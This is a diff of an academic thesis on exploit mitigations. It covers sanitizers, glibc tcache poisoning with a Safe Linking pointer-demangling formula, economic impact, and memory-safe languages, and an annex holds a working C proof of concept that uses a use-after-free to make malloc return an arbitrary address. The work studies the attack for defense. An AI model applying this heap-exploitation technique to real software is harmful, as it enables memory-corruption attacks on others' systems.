+ [<ffffffff8163ac2b>] __ubsan_handle_shift_out_of_bounds+0xeb/0x130
+ [<ffffffff815f0001>] ? radix_tree_gang_lookup_slot+0x51/0x150
+ [<ffffffff8173c586>] _mix_pool_bytes+0x1e6/0x480
+ [<ffffffff83105653>] ? dmi_walk_early+0x48/0x5c
+ [<ffffffff8173c881>] add_device_randomness+0x61/0x130
+ [<ffffffff83105b35>] ? dmi_save_one_device+0xaa/0xaa
+ [<ffffffff83105653>] dmi_walk_early+0x48/0x5c
+ [<ffffffff831066ae>] dmi_scan_machine+0x278/0x4b4
+ [<ffffffff8111d58a>] ? vprintk_default+0x1a/0x20
+ [<ffffffff830ad120>] ? early_idt_handler_array+0x120/0x120
+ [<ffffffff830b2240>] setup_arch+0x405/0xc2c
+ [<ffffffff830ad120>] ? early_idt_handler_array+0x120/0x120
+ [<ffffffff830ae053>] start_kernel+0x83/0x49a
+ [<ffffffff830ad120>] ? early_idt_handler_array+0x120/0x120
+ [<ffffffff830ad386>] x86_64_start_reservations+0x2a/0x2c
+ [<ffffffff830ad4f3>] x86_64_start_kernel+0x16b/0x17a
+=========================================================
+\end{lstlisting}
+
+\section{Sanitizers in action}
+\subsection{Tcache poisoning}
+\emph{Tcace poisoning} emerged with the introduction of the thread caching system in glibc 2.26, which was intended to improve the performance of multithreaded applications.
+However, due to the lack of security checks in this new mechanism, attackers found a way to manipulate the internal data structures of the heap.
+This manipulation, called Tcache poisoning, allows attackers to trick malloc into returning arbitrary addresses, leading to profound security implications.
+Tcache has since been updated in glibc 2.32 with a new mitigation: Safe Linking.
+Before this version, the pointers in each node of the tcache buckets were stored as is, without any protection.
+Safe Linking uses entropy from the base address of the heap (requiring \emph{ASLR}) to mangle the pointers while they are not actively used.
+
+Here is the formula used for pointer mangling:
+\begin{equation}
+    fwd_{ptr} = (addr\_of(fwd_{ptr}) >> 12) \oplus fwd_{ptr}  
+\end{equation}
+
+Because the address of the pointer and the value of the pointer are usually close together, the pointer can be unmangled if successfully leaked.
+The chances of unmangling the pointer can be increased  by abusing the fact that any malloc allocation must be aligned to hold any kind of object (in this aligned to 16 bytes).
+Here are the steps required to do this operation:
+
+\begin{equation}
+     original\_ptr = (P >> 24) \oplus P~\&~0xfffffffffff0;
+\end{equation}
+Where: 
+\begin{equation}
+     P = (mangled\_ptr >> 12) \oplus mangled\_ptr;
+\end{equation}
+
+The following segment will provide an in-depth walkthrough of this exploitation technique demonstrated on the code at Annex \ref{lst:tcache_poison}, elucidating its workings, potential impacts, and security challenges.
+\begin{lstlisting}[language={C},label={lst:entry},caption={\emph{tcache\_entry} struct}]
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  uintptr_t key;
+} tcache_entry;
+\end{lstlisting}
+
+The code at Listing~\ref{lst:entry} showcases the Linked List node type used by Tcache.
+The \emph{next} pointer is self-explanatory and the \emph{key} is a random enough\footnote{Does not need to be cryptographically secure} value that allows Tcache to detect if an allocation has already been free'd.
+When an allocation that was passed to free is intercepted by Tcache, the \emph{key} field of the allocation is checket to see if it contains the random value, and if it does the entire tcache bucket is checked to see if the allocation is already present in the list.
+The random value should be random enought that this happens rarely.
+In case free'd allocation is found in the free list, the process terminates as a double free has happened.
+
+\begin{lstlisting}[language={C},label={lst:tcachewarm},caption={Warming up the tcache}]
+ for (int i = 0; i < 3; i++) {
+    allocations[i] = malloc(0x20);
+    printf("addr of alloc[%d]: %p\n", i, allocations[i]);
+  }
+
+  printf("\n");
+
+  free(allocations[2]);
+  free(allocations[0]);
+  free(allocations[1]);
+\end{lstlisting}
+
+In Listing~\ref{lst:tcachewarm} allocations are made that are immediately freed.
+By doing so the tcache bucket corresponding to the size 0x20 is populated with the following linked list: $alloc_1 \rightarrow alloc_0 \rightarrow alloc_2$.
+
+\begin{lstlisting}[language={C},label={lst:protectptrs}]
+(allocations[1])->next 
+        = PROTECT_PTR(&(allocations[1])->next, bad_buffer);
+\end{lstlisting}
+
+Now, the \emph{next} pointer of the list overwritten, and allocations are made in order to pop allocations from the stack until our arbitrary address alocation is returned:
+
+\begin{lstlisting}[language={C}]
+  assert(fd_alloc1 == allocations[0]);
+  /* Only works sometimes due to ASLR
+   * Demangle requires the two consecutive chunks to be in the same page
+   * assert(demangle((size_t)((tcache_entry*)allocations[1])->next) ==
+   * (size_t)allocations[0]);
+   */
+
+  /* Use after free */
+  (allocations[1])->next = PROTECT_PTR(&(allocations[1])->next, bad_buffer);
+
+  assert(malloc(0x20) == allocations[1]);
+  assert(malloc(0x20) == bad_buffer);
+\end{lstlisting}
+
+This code proves that malloc returned an allocation from within the binary (BSS) and not the Heap. This technique can be extended to return any address that respects the following condition:
+
+\begin{equation}
+    address + sizeof(void*)~is~writable
+\end{equation}
+
+This condition is required due to a security mitigation in the tcache algorithm.
+In order to prevent leaking sensitive information the \emph{key} value is zeroed when giving the allocation back to the program through malloc.
+\begin{lstlisting}[language={C},label={lst:tcache_get},caption={Tcache clearing the key field}]
+static __always_inline void *
+tcache_get (size_t tc_idx)
+{
+  tcache_entry *e = tcache->entries[tc_idx];
+  if (__glibc_unlikely (!aligned_OK (e)))
+    malloc_printerr ("malloc(): unaligned tcache chunk detected");
+  tcache->entries[tc_idx] = REVEAL_PTR (e->next);
+  --(tcache->counts[tc_idx]);
+  /* VVV The key is cleared here */
+  e->key = NULL;
+  return (void *) e;
+}
+\end{lstlisting}
+
+This attack is designed to simulate the ideal situation, in which only a small number of writes are executed and there are no buffer overflows.
+Even in this scenario \emph{Address Sanitizer} was enough to completely thwart the exploitation attempt, while also providing valuable debugging insight for programmers.
+\begin{lstlisting}[language={Bash}]
+==37426==ERROR: AddressSanitizer: heap-use-after-free on address 0x603000000040 at pc 0x5565ff3b2011 bp 0x7fff0a69dfd0 sp 0x7fff0a69dfc8
+\end{lstlisting}
+
+\begin{lstlisting}[language={Bash}]
+    freed by thread T0 here:
+    ...
+    previously allocated by thread T0 here:
+\end{lstlisting}
+
+ASAN has correctly determined that writes are made to a freed chunk that was allocated and freed by thread 0 (the primary thread).
+It is essential to correctly track which allocation was made in which thread because freeing a tcache allocation twice without modifying the \emph{key} value is possible if the free's are executed in different threads because each thread has its own tcache, and when the second thread frees the allocation, it will not be found in the free list and program execution will proceed even though the \emph{key} is correctly populated.
+This vulnerability stems from the fact that if the key field is present, it is not guaranteed that the allocation was already free'd, because a user might write the correct key to that slot unknowingly.
 
 \section{Economic impact}%
-Now that the performance impact of the mitigations has been established, we will look at the economic/financial impact of the exploits these mitigations are trying to prevent.
-In recent years, the blockchain domain has emerged as one of the most publicized arenas for software exploitation.
-
+After determining the effect that the mitigations had on performance, the next step will be to investigate the economic and financial repercussions of the exploits that the mitigations were designed to stop.
+
+In recent years, the blockchain domain has emerged as one of the most prominent arenas for software exploitation.
+This development took place in recent years.
 As a technology built upon the principles of decentralization and cryptography, blockchain applications, especially cryptocurrencies, have attracted significant attention from ethical and malicious actors.
@@
 Smart-contract vulnerabilities, insecure wallets, and compromised blockchain platforms have led to numerous notable breaches, highlighting the critical importance of rigorous security practices in designing, implementing, and operating blockchain-based systems.
-Multiple publications estimated that in 2022 alone, 4 billion dollars were stolen.
+Multiple publications estimated that in 2022 alone, \emph{4 billion dollars} were stolen.
 Ransomware has also emerged as a significant threat in the software exploitation arena, causing extensive harm primarily through service disruptions.
@@
 
+\subsection{MITRE}
+The realm of digital threats is multifaceted and consistently shifting, requiring an organized strategy to spot, comprehend, and address risks.
+In answer to this need, the MITRE Corporation was created as a non-profit entity, devoted to finding solutions for a more secure world.
+A key initiative of MITRE has been the creation and oversight of the \emph{Common Vulnerabilities and Exposures} (CVE) framework.
+This system acts like a reference guide of publicly revealed cybersecurity weaknesses and threats, delivering standardized names for such risks, promoting information sharing, and allowing for data collation and pattern scrutiny.
+By establishing a shared communication framework, CVE bolsters cooperation among various segments of the cybersecurity sphere—researchers, industry professionals, and product manufacturers—in their collective efforts to fortify our digital defenses.
+
 \section{Future trends}%
-Despite the recent shift in focus of threat actors towards exploiting the human element -- the "weakest link" in the security chain -- through strategies such as SIM swapping, targeted phishing attacks, or weak passwords, it is crucial not to diminish our emphasis on fortifying software against more technical exploits.
-While these social engineering attacks have grown due to the escalating complexity required to execute successful software exploits, they should not detract from our progress in securing our software systems.
-Thgge mitigations we have developed and deployed over the years have provided a substantial defensive advantage in software exploitation.
-As the future unfolds, maintaining this advantage will be paramount, even as we strive to improve defenses against human-targeted exploits.
+Sanitization approaches are progressively being moved from the runtime phase to the compilation step as a result of increased efforts to accomplish this.
+The programming language Rust serves as a perfect illustration of this trend.
+Rust has attracted significant interest in the field of cybersecurity due to the inherent memory safety features that it possesses.
+Rust stands out from other programming languages as a potent instrument for system programming due to its ownership semantics, type safety, and memory safety, in addition to the fact that it does not do garbage collection.
+Its purpose is to defend against traditional methods of exploiting vulnerabilities and memory corruption issues.
+As a consequence of this, Rust is fast gaining ground as a desirable alternative for the development of software in critical systems where the prohibition of unauthorized access or the manipulation of data is essential.
+Because of this, there has been a significant uptick in curiosity about how its one-of-a-kind design ideas might assist in enhancing the safety of the system.
+Therefore, in the context of the continuous development of safe programming standards, it is both timely and essential to investigate Rust's potential for reducing the likelihood of exploitation.
+
+Another attempt at increasing the soundness of system programming languages is Carbon, developed by Google, a memory-safe programming language that has the power to interact in a seamless manner with historical code bases written in C and C++.
+This development is part of a larger movement toward safer programming paradigms.
+In the broader context of the software industry's efforts to reduce software exploitation resulting from memory corruption flaws, this recent finding is essential.
+Carbon, on the other hand, offers effective safeguards against such weaknesses, in contrast to historically vulnerable programming languages.
+Carbon makes it easier to shift to more safe coding techniques by providing the essential tools for interfacing with current C/C++ code bases.
+This allows the transition to take place without the need for a complete rewrite of the code that has already been built.
+This demonstrates the potential of utilizing memory-safe languages as a viable method in combating software exploitation, and highlights the need of continuing to make improvements in this field.
 
 \section{Conclusion}
-
-\printbibheading
+In conclusion, with the accelerating pace of technological advancements, the exploitation landscape continually evolves, necessitating proactive security measures.
+These include active vulnerability hunting, widespread use of sanitizers in testing and production environments, and adopting safe programming languages such as Rust, which inherently prevent particular vulnerabilities.
+In this dynamic and complex environment, secure programming languages can alleviate some of the cognitive load from developers, enabling them to focus more on the logic and less on the potential security pitfalls of their code.
+
+Simultaneously, it is crucial to recognize and address the gap between hardware and software in terms of exploit mitigation.
+While hardware support for various mitigation techniques exists, they often need to be used due to software not keeping up or compatibility issues, underscoring the need for an improved synchronization between hardware advancements and software development.
+
+Looking forward, it is evident that achieving robust cybersecurity requires a multi-faceted approach.
+By combining proactive security measures, safe programming practices, and better hardware-software integration, systems that are not just responsive but resilient to the challenges of software exploitation can be built.
+As the fight against cyber threats is far from over, continuing to invest in and develop these strategies is essential and imperative to our digital security.
+
+Scripts and code samples are available at:
+
+\texttt{https://github.com/Potochi/licenta}
+
 \printbibliography
@@
 \end{lstlisting}
+\section{Heap tcache poisoning}
+\begin{lstlisting}[language={C},label={lst:tcache_poison}]
+#include <assert.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+void *allocations[3];
+
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  uintptr_t key;
+} tcache_entry;
+
+#define PROTECT_PTR(pos, ptr)                                                  \
+  ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
+
+#define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)
+
+size_t demangle(size_t ptr) {
+    size_t o2 = (ptr >> 12) ^ ptr;
+    return (o2 >> 24) ^ o2 & 0xfffffffffff0;
+}
+
+static char bad_buffer[0x100];
+
+int main() {
+  for (int i = 0; i < 3; i++) {
+    allocations[i] = malloc(0x20);
+    printf("addr of alloc[%d]: %p\n", i, allocations[i]);
+  }
+
+  printf("\n");
+
+  free(allocations[2]);
+  free(allocations[0]);
+  free(allocations[1]);
+
+  printf("fd  of alloc[0]: %p\n", ((tcache_entry *)allocations[0])->next);
+  printf("key of alloc[0]: 0x%lx\n", ((tcache_entry *)allocations[0])->key);
+
+  printf("fd  of alloc[0]: %p\n", ((tcache_entry *)allocations[1])->next);
+  printf("key of alloc[0]: 0x%lx\n", ((tcache_entry *)allocations[1])->key);
+
+  void* fd_alloc1 = PROTECT_PTR(allocations[1], ((tcache_entry*)allocations[1])->next);
+  printf("revealed fd of alloc [1]: %p\n", fd_alloc1);
+
+  assert(fd_alloc1 == allocations[0]);
+  /* Only works sometimes due to ASLR
+   * Demangle requires the two consecutive chunks to be in the same page
+   * assert(demangle((size_t)((tcache_entry*)allocations[1])->next) ==
+   * (size_t)allocations[0]);
+   */
+
+  /* Use after free */
+  ((tcache_entry *)allocations[1])->next = PROTECT_PTR(&((tcache_entry *)allocations[1])->next, (tcache_entry *)bad_buffer);
+
+  assert(malloc(0x20) == allocations[1]);
+  assert(malloc(0x20) == bad_buffer);
+}
+\end{lstlisting}
 
